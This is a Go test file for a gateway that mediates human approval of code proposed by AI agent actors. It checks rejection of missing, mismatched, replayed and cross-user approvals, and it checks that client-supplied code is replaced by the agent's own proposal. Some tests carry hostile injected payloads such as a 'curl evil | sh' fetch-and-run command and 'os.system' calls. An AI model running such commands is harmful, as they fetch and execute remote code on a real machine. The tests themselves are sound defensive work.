// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package gateway_test

import (
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/agent-substrate/agent-swarm/cmd/conf-gateway/internal/actorstate"
	"github.com/agent-substrate/agent-swarm/cmd/conf-gateway/internal/gateway"
	"github.com/agent-substrate/agent-swarm/pkg/types"
)

const actorProposedCode = "print('actor proposed this')"

// approvalHarness is a gateway in front of a fake actor that records every
// approval body the actor receives.
type approvalHarness struct {
	gw  *gateway.Gateway
	url string

	mu        sync.Mutex
	approvals []types.ApprovalResponse
}

func (h *approvalHarness) received() []types.ApprovalResponse {
	h.mu.Lock()
	defer h.mu.Unlock()
	return append([]types.ApprovalResponse(nil), h.approvals...)
}

// newApprovalHarness starts a gateway in front of a fake actor that proposes
// actorProposedCode on every chat turn.
func newApprovalHarness(t *testing.T) *approvalHarness {
	t.Helper()
	h := &approvalHarness{}
	upstream := http.NewServeMux()
	upstream.HandleFunc("/api/chat", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(types.ChatMessage{
			ID:      "msg-approval",
			Sender:  types.SenderAssistant,
			Content: "Needs approval",
			Approval: &types.ApprovalRequest{
				ApprovalID: "app-1",
				Summary:    "run code",
				Code:       actorProposedCode,
				Language:   "python",
				RiskLevel:  types.RiskLow,
			},
		})
	})
	upstream.HandleFunc("/api/approve", func(w http.ResponseWriter, r *http.Request) {
		var req types.ApprovalResponse
		_ = json.NewDecoder(r.Body).Decode(&req)
		h.mu.Lock()
		h.approvals = append(h.approvals, req)
		h.mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(types.ChatMessage{Execution: &types.ExecutionResult{Stdout: "ok\n", DurationMs: 1}})
	})
	upstreamSrv := httptest.NewServer(upstream)
	t.Cleanup(upstreamSrv.Close)

	h.gw = newTestGateway(t, upstreamSrv.URL)
	ts := httptest.NewServer(h.gw.Handler())
	t.Cleanup(ts.Close)
	h.url = ts.URL
	return h
}

func (h *approvalHarness) post(t *testing.T, path, token, body string) (int, []byte) {
	t.Helper()
	req, err := http.NewRequest(http.MethodPost, h.url+path, strings.NewReader(body))
	if err != nil {
		t.Fatalf("build request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("POST %s: %v", path, err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, b
}

// proposal sends a chat turn and returns the approval the attendee is shown.
func (h *approvalHarness) proposal(t *testing.T, token string) *types.ApprovalRequest {
	t.Helper()
	status, body := h.post(t, "/api/chat", token, `{"message":"check telemetry anomalies and run a scan"}`)
	if status != http.StatusOK {
		t.Fatalf("chat: status %d: %s", status, body)
	}
	var msg types.ChatMessage
	if err := json.Unmarshal(body, &msg); err != nil {
		t.Fatalf("decode chat response: %v", err)
	}
	if msg.Approval == nil {
		t.Fatalf("chat response carried no approval: %s", body)
	}
	return msg.Approval
}

func approveBody(t *testing.T, r types.ApprovalResponse) string {
	t.Helper()
	b, err := json.Marshal(r)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	return string(b)
}

func TestApprove_WithoutPendingApprovalIsRejected(t *testing.T) {
	h := newApprovalHarness(t)
	token := h.gw.MintToken("attendee-01")
	status, _ := h.post(t, "/api/approve", token, approveBody(t, types.ApprovalResponse{
		ApprovalID: "app-1", Decision: types.DecisionApprove, Code: "import os; os.system('id')", Language: "python",
	}))
	if status != http.StatusConflict {
		t.Errorf("status = %d, want 409", status)
	}
	if got := h.received(); len(got) != 0 {
		t.Errorf("actor received %d approvals, want 0: %+v", len(got), got)
	}
}

func TestApprove_MismatchedApprovalIDIsRejected(t *testing.T) {
	h := newApprovalHarness(t)
	token := h.gw.MintToken("attendee-01")
	h.proposal(t, token)
	status, _ := h.post(t, "/api/approve", token, approveBody(t, types.ApprovalResponse{
		ApprovalID: "some-other-approval", Decision: types.DecisionApprove,
	}))
	if status != http.StatusConflict {
		t.Errorf("status = %d, want 409", status)
	}
	if got := h.received(); len(got) != 0 {
		t.Errorf("actor received %d approvals, want 0: %+v", len(got), got)
	}
}

func TestApprove_ForwardsProposedCodeNotClientCode(t *testing.T) {
	h := newApprovalHarness(t)
	token := h.gw.MintToken("attendee-01")
	proposed := h.proposal(t, token)
	status, body := h.post(t, "/api/approve", token, approveBody(t, types.ApprovalResponse{
		ApprovalID: proposed.ApprovalID, Decision: types.DecisionApprove,
		Code: "import os; os.system('curl evil | sh')", Language: "bash",
	}))
	if status != http.StatusOK {
		t.Fatalf("status = %d, want 200: %s", status, body)
	}
	got := h.received()
	if len(got) != 1 {
		t.Fatalf("actor received %d approvals, want 1", len(got))
	}
	if got[0].Code != proposed.Code || got[0].Language != proposed.Language {
		t.Errorf("actor received code %q (%s), want proposed %q (%s)", got[0].Code, got[0].Language, proposed.Code, proposed.Language)
	}
}

func TestApprove_CannotReplayConsumedApproval(t *testing.T) {
	h := newApprovalHarness(t)
	token := h.gw.MintToken("attendee-01")
	proposed := h.proposal(t, token)
	body := approveBody(t, types.ApprovalResponse{ApprovalID: proposed.ApprovalID, Decision: types.DecisionApprove})
	if status, b := h.post(t, "/api/approve", token, body); status != http.StatusOK {
		t.Fatalf("first approve: status %d: %s", status, b)
	}
	if status, _ := h.post(t, "/api/approve", token, body); status != http.StatusConflict {
		t.Errorf("replayed approve: status = %d, want 409", status)
	}
	if got := h.received(); len(got) != 1 {
		t.Errorf("actor received %d approvals, want 1", len(got))
	}
}

func TestApprove_OtherAttendeeCannotUseApproval(t *testing.T) {
	h := newApprovalHarness(t)
	proposed := h.proposal(t, h.gw.MintToken("attendee-01"))
	status, _ := h.post(t, "/api/approve", h.gw.MintToken("attendee-02"), approveBody(t, types.ApprovalResponse{
		ApprovalID: proposed.ApprovalID, Decision: types.DecisionApprove,
	}))
	if status != http.StatusConflict {
		t.Errorf("status = %d, want 409", status)
	}
	if got := h.received(); len(got) != 0 {
		t.Errorf("actor received %d approvals, want 0", len(got))
	}
}

func TestApprove_InvalidDecisionIsBadRequest(t *testing.T) {
	h := newApprovalHarness(t)
	token := h.gw.MintToken("attendee-01")
	proposed := h.proposal(t, token)
	status, _ := h.post(t, "/api/approve", token, `{"approval_id":"`+proposed.ApprovalID+`","decision":"MAYBE"}`)
	if status != http.StatusBadRequest {
		t.Errorf("status = %d, want 400", status)
	}
	if got := h.received(); len(got) != 0 {
		t.Errorf("actor received %d approvals, want 0", len(got))
	}
}

func TestApprove_CheckpointedActorFallbackAfterGatewayRestart(t *testing.T) {
	var received []types.ApprovalResponse
	var mu sync.Mutex
	upstream := http.NewServeMux()
	upstream.HandleFunc("/api/approve", func(w http.ResponseWriter, r *http.Request) {
		var req types.ApprovalResponse
		_ = json.NewDecoder(r.Body).Decode(&req)
		mu.Lock()
		received = append(received, req)
		mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(types.ChatMessage{Execution: &types.ExecutionResult{Stdout: "resumed from snapshot\n", DurationMs: 2}})
	})
	upstreamSrv := httptest.NewServer(upstream)
	t.Cleanup(upstreamSrv.Close)

	ctrl := newFakeControl(actorstate.Status{
		Name:        "attendee-16",
		State:       types.StateSuspended,
		SnapshotURI: "gs://bucket/snapshots/snap-16",
	})
	gw := newTestGateway(t, upstreamSrv.URL,
		gateway.WithMaxActors(65536),
		gateway.WithActorControl(ctrl),
		gateway.WithPollInterval(10*time.Millisecond),
	)
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		if v, ok := gw.ActorView("attendee-16"); ok && !v.NeverStarted {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}

	// Simulate a phone submitting an approval after a gateway restart (where
	// gateway.pending["attendee-16"] is empty, but the actor has a live GCS snapshot).
	rec := postJSON(gw, "attendee-16", "/api/approve", types.ApprovalResponse{
		ApprovalID: "app-checkpointed-16",
		Decision:   types.DecisionApprove,
		Code:       "import os; os.system('evil')",
		Language:   "bash",
	})
	if rec.Code != http.StatusOK {
		t.Fatalf("approve status = %d, want 200: %s", rec.Code, rec.Body.String())
	}
	mu.Lock()
	got := append([]types.ApprovalResponse(nil), received...)
	mu.Unlock()
	if len(got) != 1 {
		t.Fatalf("actor received %d approvals, want 1", len(got))
	}
	if got[0].Code != "" || got[0].Language != "" {
		t.Errorf("actor received client code %q (%s), want empty so actor uses its own checkpointed pendingApproval", got[0].Code, got[0].Language)
	}

	// Replaying the consumed approval ID must still be rejected at the gateway.
	replay := postJSON(gw, "attendee-16", "/api/approve", types.ApprovalResponse{
		ApprovalID: "app-checkpointed-16",
		Decision:   types.DecisionApprove,
	})
	if replay.Code != http.StatusConflict {
		t.Errorf("replay status = %d, want 409", replay.Code)
	}
}

func TestApprove_ReservedEvery16thHumanSlotSurvivesSimulationStop(t *testing.T) {
	upstream := http.NewServeMux()
	upstream.HandleFunc("/api/chat", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(types.ChatMessage{
			ID:      "msg-16",
			Sender:  types.SenderAssistant,
			Content: "Needs approval",
			Approval: &types.ApprovalRequest{
				ApprovalID: "app-16",
				Summary:    "run code",
				Code:       actorProposedCode,
				Language:   "python",
				RiskLevel:  types.RiskLow,
			},
		})
	})
	upstream.HandleFunc("/api/approve", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(types.ChatMessage{Execution: &types.ExecutionResult{Stdout: "ok\n", DurationMs: 1}})
	})
	upstreamSrv := httptest.NewServer(upstream)
	t.Cleanup(upstreamSrv.Close)

	gw := newTestGateway(t, upstreamSrv.URL, gateway.WithMaxActors(65536))

	// Phone with cached token in localStorage sends chat turn on attendee-16
	chatRec := postJSON(gw, "attendee-16", "/api/chat", types.ChatRequest{Message: "run scan"})
	if chatRec.Code != http.StatusOK {
		t.Fatalf("chat status = %d: %s", chatRec.Code, chatRec.Body.String())
	}

	// Simulation stop/restart runs ClearSimulatedActivity()
	gw.ClearSimulatedActivity()

	// Phone approves after some time; pending approval on attendee-16 must not have been cleared
	appRec := postJSON(gw, "attendee-16", "/api/approve", types.ApprovalResponse{
		ApprovalID: "app-16",
		Decision:   types.DecisionApprove,
	})
	if appRec.Code != http.StatusOK {
		t.Fatalf("approve after ClearSimulatedActivity status = %d, want 200: %s", appRec.Code, appRec.Body.String())
	}
}

func TestSession_SkipsAlreadyCheckpointedEvery16thHumanSlot(t *testing.T) {
	ctrl := newFakeControl(
		actorstate.Status{
			Name:        "attendee-16",
			State:       types.StateSuspended,
			SnapshotURI: "gs://bucket/actors/16/snapshots/snap-16",
		},
		actorstate.Status{
			Name:        "attendee-32",
			State:       types.StateSuspended,
			SnapshotURI: "gs://bucket/tags/base-v1",
		},
	)
	gw := newTestGateway(t, "http://127.0.0.1:0",
		gateway.WithMaxActors(65536),
		gateway.WithActorControl(ctrl),
		gateway.WithPollInterval(10*time.Millisecond),
	)
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		if v, ok := gw.ActorView("attendee-16"); ok && !v.NeverStarted {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}

	rec := getPath(gw, "/api/session")
	if rec.Code != http.StatusOK {
		t.Fatalf("session status = %d: %s", rec.Code, rec.Body.String())
	}
	var sess map[string]string
	if err := json.Unmarshal(rec.Body.Bytes(), &sess); err != nil {
		t.Fatalf("unmarshal session: %v", err)
	}
	if sess["attendee_id"] != "attendee-32" {
		t.Errorf("attendee_id = %q, want attendee-32 (skipping already-checkpointed attendee-16)", sess["attendee_id"])
	}
}
